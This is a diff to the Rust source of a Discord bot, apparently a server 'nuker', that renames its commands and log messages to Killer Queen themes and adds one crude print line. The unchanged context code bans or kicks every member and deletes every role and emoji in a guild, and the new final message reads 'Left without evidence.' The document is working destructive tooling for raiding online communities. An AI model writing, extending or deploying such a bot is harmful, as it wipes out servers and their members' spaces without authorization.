@@ -17,7 +17,7 @@ use serenity::framework::standard::{
 use std::io;
 
 #[group]
-#[commands(channels_del, emoji_del, roles_del, gamer, kall, ball)]
+#[commands(channels_del, emoji_del, roles_del, bitesthedust, kall, ball)]
 struct General;
 
 struct Handler;
@@ -28,12 +28,12 @@ impl EventHandler for Handler {}
 #[tokio::main]
 async fn main() {
     let framework = StandardFramework::new()
-        .configure(|c| c.prefix("obama "))
+        .configure(|c| c.prefix("killer queen "))
         .group(&GENERAL_GROUP)
         .before(before_hook)
         .after(after_hook);
 
-    println!("Please input your token.");
+    println!("cum.");
     let mut token = String::new();
     io::stdin()
         .read_line(&mut token)
@@ -107,7 +107,7 @@ async fn ball(ctx: &Context, msg: &Message) -> CommandResult {
         let memb = member.1;
         let member_id = member.0;
         match guild.kick(&ctx, member_id).await {
-            Ok(()) => println!("Successfully kicked {}", memb),
+            Ok(()) => println!("Successfully exploded {}", memb),
             Err(Error::Model(ModelError::GuildNotFound)) => {
                 println!("Couldn't determine guild of member {}", memb);
             },
@@ -136,7 +136,7 @@ async fn kall(ctx: &Context, msg: &Message) -> CommandResult {
         let memb = member.1;
         let member_id = member.0;
         match guild.ban(&ctx, member_id,0).await {
-            Ok(()) => println!("Successfully banned {}", memb),
+            Ok(()) => println!("Successfully exploded {}", memb),
             Err(Error::Model(ModelError::GuildNotFound)) => {
                 println!("Couldn't determine guild of member {}", memb);
             },
@@ -164,7 +164,7 @@ async fn emoji_del(ctx: &Context, msg: &Message) -> CommandResult {
     for emoji in guild_emoji {
         let em = emoji.0;
         match guild.delete_emoji(&ctx, em).await {
-            Ok(()) => println!("Successfully deleted {} emoji", emoji.1),
+            Ok(()) => println!("Successfully exploded {} emoji", emoji.1),
             Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                 println!("Didn't have permissions to delete emoji {}; missing: {:?}", emoji.1, missing_perms);
             },
@@ -189,7 +189,7 @@ async fn roles_del(ctx: &Context, msg: &Message) -> CommandResult {
     for role in guild_roles {
         let rol = role.0;
         match guild.delete_role(&ctx, rol).await {
-            Ok(()) => println!("Successfully deleted {} role", role.1),
+            Ok(()) => println!("Successfully exploded {} role", role.1),
             Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                 println!("Didn't have permissions to delete role {}; missing: {:?}", role.1, missing_perms);
             },
@@ -201,7 +201,7 @@ async fn roles_del(ctx: &Context, msg: &Message) -> CommandResult {
 } 
 
 #[command]
-async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
+async fn bitesthedust(ctx: &Context, msg: &Message) -> CommandResult {
     let guild = match msg.guild(ctx).await {
         Some(guild) => guild,
         None => {
@@ -232,7 +232,7 @@ async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
         let memb = member.1;
         let member_id = member.0;
         match guild.ban(&ctx, member_id,0).await {
-            Ok(()) => println!("Successfully banned {}", memb),
+            Ok(()) => println!("Successfully exploded {}", memb),
             Err(Error::Model(ModelError::GuildNotFound)) => {
                 println!("Couldn't determine guild of member {}", memb);
             },
@@ -245,7 +245,7 @@ async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
     for role in guild_roles {
         let rol = role.0;
         match guild.delete_role(&ctx, rol).await {
-            Ok(()) => println!("Successfully deleted {} role", role.1),
+            Ok(()) => println!("Successfully exploded {} role", role.1),
             Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                 println!("Didn't have permissions to delete role {}; missing: {:?}", role.1, missing_perms);
             },
@@ -255,13 +255,13 @@ async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
     for emoji in guild_emoji {
         let em = emoji.0;
         match guild.delete_emoji(&ctx, em).await {
-            Ok(()) => println!("Successfully deleted {} emoji", emoji.1),
+            Ok(()) => println!("Successfully exploded {} emoji", emoji.1),
             Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                 println!("Didn't have permissions to delete emoji {}; missing: {:?}", emoji.1, missing_perms);
             },
             _ => {},
         }
     }
-    println!("Done!");
+    println!("Left without evidence.");
     Ok(())
 }
